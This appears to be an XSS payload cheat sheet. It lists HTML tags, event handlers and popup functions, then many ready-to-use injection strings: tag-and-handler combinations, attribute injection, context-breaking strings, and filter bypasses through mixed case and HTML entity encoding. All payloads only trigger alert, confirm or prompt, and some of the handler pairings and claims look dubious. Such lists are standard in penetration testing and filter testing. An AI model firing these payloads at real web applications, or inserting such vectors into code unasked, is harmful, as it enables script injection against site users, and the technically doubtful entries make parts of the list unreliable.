### XSS Different Tags:
```yaml
<script>
<img>
<iframe>
<object>
<embed>
<form>
<input>
<svg>
<video>
<audio>
```

### XSS Different Event Listeners:
```yaml
onload
onerror
onclick
onmouseover
onfocus
onblur
onchange
onsubmit
onkeydown
onresize
```

### Different Popups:
```yaml
alert(1)
confirm(1)
prompt(1)
```

### Note: You cannot use popups in capital letters. You can use tags and event listeners in capital letters, e.g.
```yaml
`<SCRIPT>` ✅
`ONLOAD` ✅
`ALERT(1)` ❌
```


## Basic Tag + Event Listener + Popup Combinations
### Script Tag Payloads
```html
<script>alert(1)</script>
<script>confirm(1)</script>
<script>prompt(1)</script>
<script onload="alert(1)"></script>
<script onerror="confirm(1)"></script>
```

### Image Tag Payloads
```html
<img src=x onerror="alert(1)">
<img src=x onerror="confirm(1)">
<img src=x onerror="prompt(1)">
<img onload="alert(1)" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
<img onclick="alert(1)" src=x>
<img onmouseover="confirm(1)" src=x>
<img onfocus="prompt(1)" src=x tabindex=1>
```

### SVG Tag Payloads
```html
<svg onload="alert(1)">
<svg onerror="confirm(1)">
<svg onclick="prompt(1)">
<svg onmouseover="alert(1)"><rect width="100" height="100"/></svg>
<svg onfocus="confirm(1)" tabindex=1>
<svg onresize="prompt(1)">
```

### Iframe Payloads
```html
<iframe src="javascript:alert(1)">
<iframe src="javascript:confirm(1)">
<iframe src="javascript:prompt(1)">
<iframe onload="alert(1)" src="about:blank">
<iframe onerror="confirm(1)" src=x>
```

### Form and Input Payloads
```html
<form onsubmit="alert(1)"><input type=submit>
<form onsubmit="confirm(1)"><input type=submit>
<input onfocus="alert(1)" autofocus>
<input onblur="confirm(1)" autofocus>
<input onchange="prompt(1)" value="test">
<input onkeydown="alert(1)" autofocus>
<input onclick="confirm(1)" type=button value="Click">
```

### Video and Audio Payloads
```html
<video onload="alert(1)" controls>
<video onerror="confirm(1)" src=x>
<video onclick="prompt(1)" poster=x>
<audio onload="alert(1)" controls>
<audio onerror="confirm(1)" src=x>
<audio oncanplay="alert(1)" src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj">
```

### Object and Embed Payloads
```html
<object onerror="alert(1)" data=x>
<object onclick="confirm(1)" data="data:text/html,<script>prompt(1)</script>">
<embed src=x onerror="alert(1)">
<embed onclick="confirm(1)" src="javascript:alert(1)">
```

## Advanced Combination Payloads
### Multi-Event Combinations
```html
<img src=x onerror="alert(1)" onclick="confirm(1)" onmouseover="prompt(1)">
<svg onload="alert(1)" onclick="confirm(1)"><rect onmouseover="prompt(1)" width="100" height="100"/></svg>
<input onfocus="alert(1)" onblur="confirm(1)" onchange="prompt(1)" autofocus>
```

### Attribute Injection Payloads
```html
" onclick="alert(1)" "
' onmouseover="confirm(1)" '
"> <script>prompt(1)</script> <"
' onfocus="alert(1)" autofocus '
"onload="confirm(1)"
```

### Event Handler Variations
```html
<body onload="alert(1)">
<body onresize="confirm(1)">
<div onclick="prompt(1)">Click me</div>
<button onmouseover="alert(1)">Hover</button>
<textarea onfocus="confirm(1)" autofocus></textarea>
<select onchange="prompt(1)"><option>1</option><option>2</option></select>
```

### Context-Breaking Payloads
```html
</script><script>alert(1)</script>
"></script><svg onload="confirm(1)">
'><img src=x onerror="prompt(1)">
</title><script>alert(1)</script>
</textarea><script>confirm(1)</script>
```

## Filter Bypass Variations
### Case Variation and Obfuscation
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR="confirm(1)">
<svg/onload="prompt(1)">
<img src=x onerror=alert(1)>
<iframe src=javascript:confirm(1)>
```

### Encoding Variations
```html
<script>alert&#40;1&#41;</script>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<svg onload="&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;">
```
